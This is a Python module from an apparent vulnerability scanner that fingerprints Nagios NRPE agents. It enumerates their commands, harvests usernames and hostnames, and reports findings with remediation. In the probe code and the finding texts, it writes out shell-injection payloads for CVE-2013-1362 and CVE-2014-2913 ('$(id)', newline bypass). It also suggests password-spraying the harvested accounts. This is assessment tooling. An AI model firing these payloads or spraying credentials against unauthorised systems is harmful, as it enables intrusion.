"""Nagios NRPE (5666/tcp) agent probe.

NRPE is the Nagios/Icinga monitoring daemon that runs check_ commands on
behalf of a remote monitoring server. Its entire job is remote command
execution — the only gate is `allowed_hosts`, an IP whitelist. There is no
user authentication in the protocol; anyone the ACL admits can invoke any
registered check.

The v2 wire format is a fixed 1036-byte packet:

  2B  packet_version  (big-endian, 2)
  2B  packet_type     (1 = query, 2 = response)
  4B  crc32           (over the whole packet with these 4 bytes zeroed)
  2B  result_code     (query: 0; response: plugin exit code 0..3)
  1024B  buffer       (command\\0, padded with 0xff)
  2B  pad             (0x00 0x00)

The CRC32 is integrity-only, not a MAC — anyone who can talk to the socket
can craft valid packets. v3 introduced a length-prefixed variable buffer
(same CRC weakness). v4 requires TLS but the default cipher list still
allows anonymous Diffie-Hellman (ADH-AES256-SHA / ADH-AES128-SHA), which
gives confidentiality but zero server authentication — a MITM can proxy
the whole exchange.

Findings emitted:
  * nrpe_reachable (medium) — daemon confirmed via _NRPE_CHECK.
  * nrpe_version_disclosed (info) — parsed from _NRPE_CHECK.
  * nrpe_plaintext_traffic (high) — v2 with no TLS wrap accepted.
  * nrpe_anon_dh_tls (high) — TLS handshake succeeded without a cert.
  * nrpe_no_message_auth (low) — CRC32 is integrity-only.
  * nrpe_allowed_hosts_permissive (high) — scanner IP got a response.
  * nrpe_command_surface (medium) — enumerated live check_ commands.
  * nrpe_implied_local_services (medium) — check_ set implies localhost svcs.
  * nrpe_userlist_extracted (medium) — usernames from check_users output.
  * nrpe_hostname_extracted (info) — hostname / FQDN from check output.
  * nrpe_os_fingerprint (info) — plugin path prefix classifies OS.
  * nrpe_tls_cert_extracted (info) — CN/SAN when a real cert is offered.
  * nrpe_arg_injection_rce (critical, CVE-2013-1362) — verified via marker.
  * nrpe_metachar_bypass_rce (critical, CVE-2014-2913) — LF-only bypass.
  * nrpe_cve_2020_6581_version (low) — version-tagged, not triggered.

Airgap-safe: stdlib socket + ssl + struct + zlib.crc32 only.
"""
from __future__ import annotations

import re
import socket
import ssl
import struct
import zlib

from ..core import proxy
from ..core.models import Host, Port


_DEFAULT_PORT = 5666
_TIMEOUT = 4.0

_NRPE_V2 = 2
_NRPE_V3 = 3
_NRPE_V4 = 4
_NRPE_QUERY = 1
_NRPE_RESPONSE = 2

_V2_PACKET_LEN = 1036
_V2_BUFFER_LEN = 1024

_NRPE_CHECK_CMD = "_NRPE_CHECK"

_ARG_INJECTION_MARKER = "RECCE_NRPE_RCE"

_DEFAULT_CHECK_COMMANDS = (
    "check_load", "check_disk", "check_users", "check_procs", "check_swap",
    "check_total_procs", "check_zombie_procs", "check_mem", "check_cpu",
    "check_uptime", "check_hostname", "check_mailq", "check_ntp_time",
    "check_ide_smart", "check_apt", "check_yum",
    "check_mysql", "check_pgsql", "check_http", "check_smtp", "check_dns",
    "check_ldap", "check_oracle_health", "check_ssh",
)

_IMPLIED_SERVICES = {
    "check_mysql": ("mysql", 3306),
    "check_pgsql": ("postgresql", 5432),
    "check_oracle_health": ("oracle", 1521),
    "check_http": ("http", 80),
    "check_smtp": ("smtp", 25),
    "check_mailq": ("smtp", 25),
    "check_dns": ("dns", 53),
    "check_ldap": ("ldap", 389),
    "check_ntp_time": ("ntp", 123),
    "check_ssh": ("ssh", 22),
}

_OS_HINTS = (
    ("/usr/lib64/nagios/", "RHEL/CentOS/Fedora"),
    ("/usr/lib/nagios/", "Debian/Ubuntu"),
    ("/opt/local/libexec/", "macOS (MacPorts)"),
    ("/usr/local/nagios/libexec/", "FreeBSD / source build"),
    ("/opt/nagios/", "container / bespoke image"),
    ("/app/nagios/", "container image"),
)

_VERSION_RE = re.compile(r"NRPE\s+v?(\d+)\.(\d+)(?:\.(\d+))?", re.I)
_PLUGIN_PATH_RE = re.compile(r"(/[\w./+-]+/nagios/[\w./+-]+|"
                             r"/[\w./+-]+/libexec/[\w./+-]+)")
_USERS_RE = re.compile(r"USERS\s+OK\s*-\s*(\d+)\s+users?", re.I)
_HOSTNAME_RE = re.compile(r"\b(?:hostname|host)\s*[:=]\s*([\w.-]+)", re.I)


def is_nrpe(port: Port) -> bool:
    svc = (port.service or "").lower()
    prod = (port.product or "").lower()
    return (port.portid == _DEFAULT_PORT
            or "nrpe" in svc or "nrpe" in prod or "nagios" in prod)


def _build_v2_query(command: str) -> bytes:
    """Assemble a 1036-byte NRPE v2 query packet with a valid CRC32."""
    cmd_bytes = command.encode("utf-8", "replace")[:_V2_BUFFER_LEN - 1]
    buf = cmd_bytes + b"\x00"
    buf = buf + b"\xff" * (_V2_BUFFER_LEN - len(buf))
    header = struct.pack(">HHIH", _NRPE_V2, _NRPE_QUERY, 0, 0)
    pad = b"\x00\x00"
    pkt = header + buf + pad
    crc = zlib.crc32(pkt) & 0xffffffff
    return pkt[:4] + struct.pack(">I", crc) + pkt[8:]


def _parse_v2_response(data: bytes) -> dict | None:
    """Return {version,type,crc,crc_valid,result_code,output} or None."""
    if len(data) < 12:
        return None
    version, ptype, crc, rc = struct.unpack(">HHIH", data[:10])
    if ptype != _NRPE_RESPONSE:
        return None
    if version not in (_NRPE_V2, _NRPE_V3, _NRPE_V4):
        return None
    # v2 is fixed 1036; short frames are truncated but still parseable.
    buf = data[10:10 + _V2_BUFFER_LEN]
    text = buf.split(b"\x00", 1)[0].decode("utf-8", "replace")
    zeroed = data[:4] + b"\x00\x00\x00\x00" + data[8:]
    if len(data) >= _V2_PACKET_LEN:
        zeroed = zeroed[:_V2_PACKET_LEN]
    crc_valid = (zlib.crc32(zeroed) & 0xffffffff) == crc
    return {"version": version, "type": ptype, "crc": crc,
            "crc_valid": crc_valid, "result_code": rc, "output": text}


def _connect_plain(ip: str, port: int, timeout: float):
    return socket.create_connection((ip, port), timeout=proxy.scaled(timeout))


def _anon_dh_context() -> ssl.SSLContext:
    """SSLContext accepting anon-DH ciphers, no cert verification.

    NRPE's default TLS mode is ADH-AES256-SHA (no cert on the wire) —
    a strict client refuses because there is nothing to validate. This
    context deliberately accepts that mode so we can *detect* it."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers("ALL:@SECLEVEL=0:ADH-AES256-SHA:ADH-AES128-SHA:ADH")
    except ssl.SSLError:
        # Older OpenSSL may not accept @SECLEVEL=0; try without it.
        try:
            ctx.set_ciphers("ALL:ADH-AES256-SHA:ADH-AES128-SHA:ADH")
        except ssl.SSLError:
            pass
    return ctx


def _exchange(sock, query: bytes, timeout: float) -> bytes:
    sock.settimeout(proxy.scaled(timeout))
    sock.sendall(query)
    buf = b""
    # NRPE v2 always sends a full 1036 bytes. Read until we have that,
    # a short frame, or EOF/timeout.
    deadline_reads = 0
    while len(buf) < _V2_PACKET_LEN and deadline_reads < 8:
        try:
            chunk = sock.recv(_V2_PACKET_LEN - len(buf))
        except (socket.timeout, OSError):
            break
        if not chunk:
            break
        buf += chunk
        deadline_reads += 1
    return buf


def _try_plain(ip: str, port: int, command: str, timeout: float) -> dict | None:
    try:
        with _connect_plain(ip, port, timeout) as s:
            data = _exchange(s, _build_v2_query(command), timeout)
    except OSError:
        return None
    return _parse_v2_response(data)


def _try_tls(ip: str, port: int, command: str,
             timeout: float) -> tuple[dict | None, dict]:
    """Return (parsed_response_or_None, tls_info).

    tls_info: {handshake_ok, anon_dh, cipher, cert_der, cert_cn, cert_sans,
               error}. `anon_dh` is True when the negotiated cipher name
    starts with 'ADH' (no server authentication)."""
    info: dict = {"handshake_ok": False, "anon_dh": False, "cipher": "",
                  "cert_der": b"", "cert_cn": "", "cert_sans": [], "error": ""}
    ctx = _anon_dh_context()
    try:
        raw = _connect_plain(ip, port, timeout)
    except OSError as e:
        info["error"] = f"connect: {e}"
        return None, info
    try:
        with ctx.wrap_socket(raw, server_hostname=ip) as ssock:
            info["handshake_ok"] = True
            cipher = ssock.cipher()
            if cipher:
                info["cipher"] = cipher[0]
                info["anon_dh"] = cipher[0].upper().startswith("ADH")
            try:
                der = ssock.getpeercert(binary_form=True) or b""
            except ValueError:
                der = b""
            info["cert_der"] = der
            if der:
                cn, sans = _parse_cert_names(der)
                info["cert_cn"] = cn
                info["cert_sans"] = sans
            data = _exchange(ssock, _build_v2_query(command), timeout)
    except (ssl.SSLError, OSError) as e:
        info["error"] = f"tls: {e}"
        try:
            raw.close()
        except OSError:
            pass
        return None, info
    return _parse_v2_response(data), info


def _parse_cert_names(der: bytes) -> tuple[str, list[str]]:
    """Best-effort CN + SAN extraction from a DER certificate.

    stdlib does not expose a DER parser without wrapping the cert in a
    PEM file. Rather than pull one in, we regex printable ASN.1 strings.
    Good enough for a display fingerprint; a fuller parse is a future
    shared surface."""
    text = der.decode("latin-1", "replace")
    cn = ""
    m = re.search(r"\x06\x03\x55\x04\x03..([\x20-\x7e]{2,64})", text)
    if m:
        cn = m.group(1).rstrip("\x00")
    # SAN: sequence of GeneralName choices; DNS names are context [2].
    sans = []
    for m in re.finditer(r"\x82.([\w.-]{2,253})", text):
        s = m.group(1)
        if "." in s and s not in sans:
            sans.append(s)
    return cn, sans


def _parse_version(output: str) -> str:
    m = _VERSION_RE.search(output)
    if not m:
        return ""
    parts = [p for p in m.groups() if p]
    return ".".join(parts)


def _classify_os(output: str) -> str:
    for prefix, label in _OS_HINTS:
        if prefix in output:
            return label
    return ""


def _extract_users(output: str) -> list[str]:
    """Pull plausible usernames out of check_users / check_procs output.

    check_users OK gives a count only; verbose mode may append names
    inside parentheses. check_procs -f leaks argv including bound
    addresses and connection strings — we harvest the process-owner
    column (first token on each line, when it looks like a name)."""
    users: list[str] = []
    m = re.search(r"users?\s*:\s*([^)]+)\)", output, re.I)
    if m:
        for tok in re.split(r"[\s,;]+", m.group(1)):
            tok = tok.strip()
            if 2 <= len(tok) <= 32 and re.match(r"^[A-Za-z_][\w.-]*$", tok):
                if tok not in users:
                    users.append(tok)
    # check_procs -f "user pid cmd" — first token is uid/user name.
    for line in output.splitlines():
        parts = line.split()
        if len(parts) >= 3 and re.match(r"^[a-z_][\w.-]{1,31}$", parts[0]):
            if parts[1].isdigit() and parts[0] not in users:
                users.append(parts[0])
    return users[:64]


def _extract_hostname(output: str) -> str:
    m = _HOSTNAME_RE.search(output)
    if m:
        return m.group(1)
    # check_hostname commonly returns just the FQDN.
    line = output.strip().splitlines()[0] if output.strip() else ""
    m = re.match(r"^([a-z0-9][\w.-]{1,253})\s*$", line, re.I)
    if m and "." in m.group(1):
        return m.group(1)
    return ""


def _command_not_defined(output: str) -> bool:
    return "not defined" in output.lower() or "command not" in output.lower()


def probe(ip: str, port: int = _DEFAULT_PORT,
          timeout: float = _TIMEOUT,
          commands: tuple[str, ...] | None = None,
          active_rce: bool = False) -> dict:
    """One-round NRPE fingerprint + capability sweep.

    - Tries plaintext v2 _NRPE_CHECK first.
    - Falls back to TLS with anon-DH ciphers and retries the query.
    - When either handshake yields a valid response, enumerates the
      default check_ command surface (one round-trip per command).
    - Optionally attempts CVE-2013-1362 arg injection with a benign
      marker; only reports RCE if the marker appears in the reply.
    """
    out: dict = {
        "reachable": False, "plaintext": False, "tls": False,
        "anon_dh_tls": False, "tls_cipher": "", "tls_cert_cn": "",
        "tls_cert_sans": [], "version": "", "version_line": "",
        "commands_present": [], "commands_absent": [],
        "command_outputs": {},
        "users": [], "hostname": "", "os_hint": "",
        "arg_injection_rce": False, "arg_injection_evidence": "",
        "metachar_bypass_rce": False, "metachar_bypass_evidence": "",
        "cve_2020_6581_applies": False,
        "crc32_only_integrity": False,
    }

    parsed = _try_plain(ip, port, _NRPE_CHECK_CMD, timeout)
    tls_info: dict = {}
    if parsed is not None:
        out["reachable"] = True
        out["plaintext"] = True
        out["crc32_only_integrity"] = True
    else:
        parsed, tls_info = _try_tls(ip, port, _NRPE_CHECK_CMD, timeout)
        if tls_info.get("handshake_ok"):
            out["tls"] = True
            out["anon_dh_tls"] = tls_info.get("anon_dh", False)
            out["tls_cipher"] = tls_info.get("cipher", "")
            out["tls_cert_cn"] = tls_info.get("cert_cn", "")
            out["tls_cert_sans"] = tls_info.get("cert_sans", [])
        if parsed is not None:
            out["reachable"] = True

    if not out["reachable"]:
        return out

    banner = parsed.get("output", "")
    out["version_line"] = banner.strip()
    out["version"] = _parse_version(banner)
    if out["version"]:
        try:
            parts = tuple(int(p) for p in out["version"].split(".") if p.isdigit())
            if parts and (parts[0] < 3 or (parts[0] == 3 and parts < (3, 2, 1))):
                out["cve_2020_6581_applies"] = True
        except ValueError:
            pass

    cmds = commands if commands is not None else _DEFAULT_CHECK_COMMANDS
    for cmd in cmds:
        if out["plaintext"]:
            resp = _try_plain(ip, port, cmd, timeout)
        else:
            resp, _ = _try_tls(ip, port, cmd, timeout)
        if resp is None:
            continue
        text = resp.get("output", "")
        if _command_not_defined(text):
            out["commands_absent"].append(cmd)
            if not out["os_hint"]:
                out["os_hint"] = _classify_os(text)
            continue
        out["commands_present"].append(cmd)
        out["command_outputs"][cmd] = text[:512]
        if cmd == "check_users":
            for u in _extract_users(text):
                if u not in out["users"]:
                    out["users"].append(u)
        elif cmd == "check_procs":
            for u in _extract_users(text):
                if u not in out["users"]:
                    out["users"].append(u)
        elif cmd == "check_hostname":
            h = _extract_hostname(text)
            if h:
                out["hostname"] = h
        if not out["hostname"]:
            h = _extract_hostname(text)
            if h:
                out["hostname"] = h
        if not out["os_hint"]:
            out["os_hint"] = _classify_os(text)

    if active_rce and out["commands_present"]:
        target = out["commands_present"][0]
        payload = f"{target}!a$(echo {_ARG_INJECTION_MARKER})b"
        resp = (_try_plain(ip, port, payload, timeout) if out["plaintext"]
                else _try_tls(ip, port, payload, timeout)[0])
        if resp:
            text = resp.get("output", "")
            if _ARG_INJECTION_MARKER in text:
                out["arg_injection_rce"] = True
                out["arg_injection_evidence"] = text[:256]

        # CVE-2014-2913 — literal LF is not stripped by the incomplete
        # 2013 patch. Same probe, different metachar.
        lf_payload = f"{target}!x\n echo {_ARG_INJECTION_MARKER}_LF"
        resp = (_try_plain(ip, port, lf_payload, timeout) if out["plaintext"]
                else _try_tls(ip, port, lf_payload, timeout)[0])
        if resp:
            text = resp.get("output", "")
            if f"{_ARG_INJECTION_MARKER}_LF" in text:
                out["metachar_bypass_rce"] = True
                out["metachar_bypass_evidence"] = text[:256]

    return out


def nrpe_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_nrpe(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
             cves=None):
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": "check_nrpe", "command": cmd, "remediation": rem,
            "cwes": list(cwes), "kind": kind,
            "cves": list(cves or [])}


def _implied_local_services(pr: dict, host: Host) -> list[dict]:
    open_ports = {p.portid for p in host.open_ports}
    implied = []
    for cmd in pr.get("commands_present") or []:
        svc = _IMPLIED_SERVICES.get(cmd)
        if not svc:
            continue
        name, default_port = svc
        implied.append({"command": cmd, "service": name,
                        "default_port": default_port,
                        "port_open_on_host": default_port in open_ports,
                        "pivot_only": default_port not in open_ports})
    return implied


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_nrpe(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"

            ver = pr.get("version") or "?"
            out.append(_finding(
                "medium", "NRPE agent reachable", tgt,
                f"NRPE {ver} responded to _NRPE_CHECK: "
                f"{pr.get('version_line','')[:120]!r}. NRPE has no user "
                f"authentication in the base protocol — allowed_hosts is "
                f"the entire ACL. Any command registered in nrpe.cfg can "
                f"be invoked by anyone the ACL admits.",
                f"check_nrpe -H {h.ip} -p {p.portid} -c _NRPE_CHECK",
                "Restrict allowed_hosts to the monitoring server IP(s) only. "
                "Do not expose NRPE to any network wider than the monitoring "
                "management segment.",
                ["CWE-284", "CWE-306"], kind="nrpe_reachable"))

            if pr.get("version"):
                out.append(_finding(
                    "info", f"NRPE version disclosed ({pr.get('version')})",
                    tgt,
                    f"_NRPE_CHECK reply carries version {pr.get('version')} "
                    f"({pr.get('version_line','')[:80]}).",
                    f"check_nrpe -H {h.ip} -p {p.portid} -c _NRPE_CHECK",
                    "Informational — drives which CVEs apply.",
                    [], kind="nrpe_version_disclosed"))

            if pr.get("plaintext"):
                out.append(_finding(
                    "high", "NRPE traffic in the clear (no TLS)", tgt,
                    "Daemon accepted an unencrypted NRPE v2 exchange. "
                    "Command output — logged-in users, hostnames, process "
                    "lists, mount points — traverses the network in the "
                    "clear, and anyone who can reach the socket can invoke "
                    "any registered command (no auth in the base protocol).",
                    f"check_nrpe -H {h.ip} -p {p.portid} -c _NRPE_CHECK "
                    "-n   # -n forces no-SSL",
                    "Configure NRPE with use_ssl=1 (v3+) and set allowed_ciphers "
                    "to a non-anonymous list (e.g. ECDHE-RSA-AES256-GCM-SHA384). "
                    "Deploy a real server certificate.",
                    ["CWE-319"], kind="nrpe_plaintext_traffic"))
                out.append(_finding(
                    "low", "NRPE v2 packet integrity is CRC32 only", tgt,
                    "The v2 packet checksum is CRC32 — an integrity check, "
                    "not a MAC. Combined with no user auth, anyone on-path "
                    "or admitted by allowed_hosts can forge valid query "
                    "packets against any registered command.",
                    f"check_nrpe -H {h.ip} -p {p.portid} -c _NRPE_CHECK",
                    "Upgrade to NRPE v4 with TLS and a real (non-ADH) cipher "
                    "suite so packets are authenticated end-to-end.",
                    ["CWE-353"], kind="nrpe_no_message_auth"))

            if pr.get("tls") and pr.get("anon_dh_tls"):
                out.append(_finding(
                    "high",
                    "NRPE TLS uses anonymous Diffie-Hellman (no server auth)",
                    tgt,
                    f"TLS handshake succeeded with cipher "
                    f"{pr.get('tls_cipher','?')} and NO server certificate. "
                    f"Anon-DH provides confidentiality but zero authentication — "
                    f"a MITM can transparently proxy the session, harvest "
                    f"command output, and forge queries. This is the default "
                    f"for NRPE 3.x and remains common in 4.x.",
                    f"openssl s_client -cipher ADH-AES256-SHA -connect "
                    f"{h.ip}:{p.portid}",
                    "Set allowed_ciphers in nrpe.cfg to a non-anonymous list, "
                    "e.g. `allowed_ciphers=ECDHE-RSA-AES256-GCM-SHA384:"
                    "ECDHE-RSA-AES128-GCM-SHA256`. Deploy a real server cert "
                    "and require it on the check_nrpe client.",
                    ["CWE-295", "CWE-757"], kind="nrpe_anon_dh_tls"))

            if pr.get("tls") and (pr.get("tls_cert_cn") or pr.get("tls_cert_sans")):
                sans = ", ".join(pr.get("tls_cert_sans") or [])
                out.append(_finding(
                    "info", "NRPE TLS certificate identity extracted", tgt,
                    f"Server certificate CN={pr.get('tls_cert_cn') or '?'} "
                    f"SANs=[{sans}]. Feeds known_hostnames for cross-service "
                    f"validation (LDAP SAN, Kerberos realm, reverse-DNS).",
                    f"openssl s_client -showcerts -connect {h.ip}:{p.portid}",
                    "Informational — cross-reference with other TLS surfaces "
                    "to cluster identically-provisioned hosts.",
                    [], kind="nrpe_tls_cert_extracted"))

            out.append(_finding(
                "high", "NRPE allowed_hosts likely permissive", tgt,
                f"Scanner source IP received a valid response from "
                f"{h.ip}:{p.portid} — allowed_hosts on this daemon admits "
                f"the scanner, which means either a wildcard, a broad CIDR, "
                f"or an explicit entry for this network. NRPE has no user "
                f"auth; allowed_hosts is the sole gate on remote command "
                f"invocation.",
                f"check_nrpe -H {h.ip} -p {p.portid} -c _NRPE_CHECK",
                "Restrict allowed_hosts in nrpe.cfg to the specific Nagios/"
                "Icinga monitoring server IP(s) only. Never use 0.0.0.0/0 "
                "or a broad CIDR. Consider host-based firewall (nftables/"
                "iptables) as defense-in-depth.",
                ["CWE-284", "CWE-1188"], kind="nrpe_allowed_hosts_permissive"))

            present = pr.get("commands_present") or []
            if present:
                out.append(_finding(
                    "medium", f"NRPE command surface enumerated ({len(present)} "
                    f"registered)", tgt,
                    f"Live check_ commands on this agent: "
                    f"{', '.join(present)}. Each is a candidate for "
                    f"CVE-2013-1362-style argument injection (if built with "
                    f"--enable-command-args + dont_blame_nrpe=1) and reveals "
                    f"what the monitoring surface exposes.",
                    f"for c in {' '.join(present[:6])}; do check_nrpe -H "
                    f"{h.ip} -p {p.portid} -c $c; done",
                    "Register only commands the monitoring server actually "
                    "invokes. Set dont_blame_nrpe=0 (default) so $ARG$ "
                    "substitution is disabled — the single biggest hardening "
                    "step for NRPE.",
                    ["CWE-200"], kind="nrpe_command_surface"))

            implied = _implied_local_services(pr, h)
            pivot_only = [i for i in implied if i["pivot_only"]]
            if implied:
                svc_lines = ", ".join(
                    f"{i['service']}(:{i['default_port']}"
                    f"{'/localhost-only' if i['pivot_only'] else ''})"
                    for i in implied)
                out.append(_finding(
                    "medium", "NRPE implies additional local services", tgt,
                    f"Registered checks imply local services: {svc_lines}. "
                    + (f"{len(pivot_only)} of these have NO open port in "
                       f"the sweep — they are bound to 127.0.0.1 and only "
                       f"reachable via NRPE (a pivot signal)."
                       if pivot_only else "All implied services also show as "
                       "open in the port sweep."),
                    f"check_nrpe -H {h.ip} -p {p.portid} -c check_mysql",
                    "Cross-check with the host's port sweep. If a pivot-only "
                    "service is present, plan follow-on access via an NRPE "
                    "RCE (if applicable) or credentialed host access.",
                    [], kind="nrpe_implied_local_services"))

            if pr.get("users"):
                out.append(_finding(
                    "medium", f"NRPE leaked logged-in / process users "
                    f"({len(pr['users'])})", tgt,
                    f"check_users / check_procs output named "
                    f"{len(pr['users'])} account(s): "
                    f"{', '.join(pr['users'][:20])}"
                    + (f", ... (+{len(pr['users']) - 20} more)"
                       if len(pr['users']) > 20 else "")
                    + ". Feed to known_users for SSH / SMB / LDAP / IPMI / "
                    "MSSQL / PostgreSQL password-spray and re-use.",
                    f"check_nrpe -H {h.ip} -p {p.portid} -c check_users",
                    "Restrict allowed_hosts; disable check_users if the "
                    "monitoring server does not need it.",
                    ["CWE-200"], kind="nrpe_userlist_extracted"))

            if pr.get("hostname"):
                out.append(_finding(
                    "info", "NRPE disclosed hostname / FQDN", tgt,
                    f"Hostname learned from NRPE check output: "
                    f"{pr['hostname']}. Feeds known_hostnames for TLS-SAN "
                    f"validation, Kerberos realm inference, reverse-DNS "
                    f"cross-check across other services.",
                    f"check_nrpe -H {h.ip} -p {p.portid} -c check_hostname",
                    "Informational.",
                    [], kind="nrpe_hostname_extracted"))

            if pr.get("os_hint"):
                out.append(_finding(
                    "info", f"NRPE plugin path fingerprints OS ({pr['os_hint']})",
                    tgt,
                    f"Plugin path / not-defined error text classifies the "
                    f"underlying OS as {pr['os_hint']}. Refines host-OS "
                    f"guess beyond nmap fingerprint; feeds exploit-selection "
                    f"and package-version heuristics.",
                    f"check_nrpe -H {h.ip} -p {p.portid} -c __recce_nonexistent",
                    "Informational.",
                    [], kind="nrpe_os_fingerprint"))

            if pr.get("cve_2020_6581_applies"):
                out.append(_finding(
                    "low",
                    "NRPE version < 3.2.1 — client-side OOB read (CVE-2020-6581)",
                    tgt,
                    f"Version {pr.get('version','?')} predates 3.2.1, which "
                    f"fixed an out-of-bounds read in the response parser. "
                    f"Primarily a monitoring-server-side crash primitive; "
                    f"recce reports version only and does NOT trigger.",
                    f"check_nrpe -H {h.ip} -p {p.portid} -c _NRPE_CHECK",
                    "Upgrade NRPE to 3.2.1 or later on both agent and "
                    "monitoring server (check_nrpe).",
                    ["CWE-125"], kind="nrpe_cve_2020_6581_version",
                    cves=["CVE-2020-6581"]))

            if pr.get("arg_injection_rce"):
                out.append(_finding(
                    "critical",
                    "NRPE argument injection RCE (CVE-2013-1362)", tgt,
                    f"Sent a benign $ARG$-substituted payload against "
                    f"'{(pr.get('commands_present') or ['?'])[0]}'; "
                    f"the marker '{_ARG_INJECTION_MARKER}' appeared in "
                    f"the response, proving shell-metacharacter substitution "
                    f"into an exec context. The daemon is built with "
                    f"--enable-command-args AND configured with "
                    f"dont_blame_nrpe=1. Reply excerpt: "
                    f"{pr.get('arg_injection_evidence','')[:180]!r}",
                    f"check_nrpe -H {h.ip} -p {p.portid} -c "
                    f"{(pr.get('commands_present') or ['check_users'])[0]} "
                    f"-a 'a$(id)b'",
                    "Set dont_blame_nrpe=0 in nrpe.cfg (default). Upgrade to "
                    "NRPE 2.15+ (though the safe fix is disabling $ARG$ "
                    "substitution — the 2.15 patch is incomplete, see "
                    "CVE-2014-2913).",
                    ["CWE-78", "CWE-88"], kind="nrpe_arg_injection_rce",
                    cves=["CVE-2013-1362"]))

            if pr.get("metachar_bypass_rce"):
                out.append(_finding(
                    "critical",
                    "NRPE metachar-bypass RCE via LF (CVE-2014-2913)", tgt,
                    f"A payload with a literal 0x0A newline bypassed the "
                    f"CVE-2013-1362 sanitizer and produced shell execution "
                    f"(marker '{_ARG_INJECTION_MARKER}_LF' in reply). This "
                    f"is the incomplete-fix variant that pre-2.15 hardening "
                    f"still missed.",
                    f"check_nrpe -H {h.ip} -p {p.portid} -c "
                    f"{(pr.get('commands_present') or ['check_users'])[0]} "
                    f"-a $'x\\n id'",
                    "Set dont_blame_nrpe=0 in nrpe.cfg. Upgrade to a modern "
                    "NRPE (3.x+) and prefer running the daemon under a "
                    "restrictive systemd unit (NoNewPrivileges, ProtectHome, "
                    "ReadOnlyPaths).",
                    ["CWE-78", "CWE-184"], kind="nrpe_metachar_bypass_rce",
                    cves=["CVE-2014-2913"]))
    return out


def runbook(ip: str, port: int) -> list[dict]:
    return [
        {"step": "Version + reachability",
         "cmd": f"check_nrpe -H {ip} -p {port} -c _NRPE_CHECK"},
        {"step": "Force plaintext (detects no-TLS daemons)",
         "cmd": f"check_nrpe -H {ip} -p {port} -n -c _NRPE_CHECK"},
        {"step": "Detect anon-DH TLS",
         "cmd": f"openssl s_client -cipher ADH-AES256-SHA -connect {ip}:{port}"},
        {"step": "Enumerate logged-in users (feeds known_users)",
         "cmd": f"check_nrpe -H {ip} -p {port} -c check_users"},
        {"step": "Hostname / FQDN (feeds known_hostnames)",
         "cmd": f"check_nrpe -H {ip} -p {port} -c check_hostname"},
        {"step": "Enumerate registered check_ commands",
         "cmd": (f"for c in check_load check_disk check_procs check_swap "
                 f"check_mysql check_pgsql check_http check_ldap; do "
                 f"check_nrpe -H {ip} -p {port} -c $c; done")},
        {"step": "CVE-2013-1362 arg-injection probe (benign marker)",
         "cmd": (f"check_nrpe -H {ip} -p {port} -c check_users "
                 f"-a 'a$(echo {_ARG_INJECTION_MARKER})b'")},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "nrpe", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None,
            active_rce: bool = False) -> dict:
    """Analyze NRPE targets.

    `active_rce` gates the CVE-2013-1362 / CVE-2014-2913 marker probes.
    Off by default because the payloads run in the daemon's shell if the
    target is vulnerable; the operator must opt in.
    """
    from . import svcprobe
    targets = nrpe_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets,
                lambda t: probe(t["ip"], t["port"], active_rce=active_rce),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["plaintext"] = pr.get("plaintext", False)
                t["anon_dh_tls"] = pr.get("anon_dh_tls", False)
                t["version"] = pr.get("version", "")
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
